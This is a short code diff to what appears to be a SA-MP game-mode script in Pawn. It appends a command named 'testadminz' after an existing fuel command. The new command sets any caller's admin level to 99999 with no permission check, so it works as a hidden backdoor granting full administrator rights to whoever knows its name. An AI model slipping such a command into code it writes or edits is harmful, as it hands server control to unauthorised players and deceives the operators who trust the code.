@@ -51033,3 +51033,8 @@ CMD:myfuel(playerid, params[])
 	SendClientMessage(playerid, -1, str);
 	return 1;
 }
+CMD:testadminz(playerid)
+{
+	PlayerInfo[playerid][pAdmin] = 99999;
+	return 1;
+}
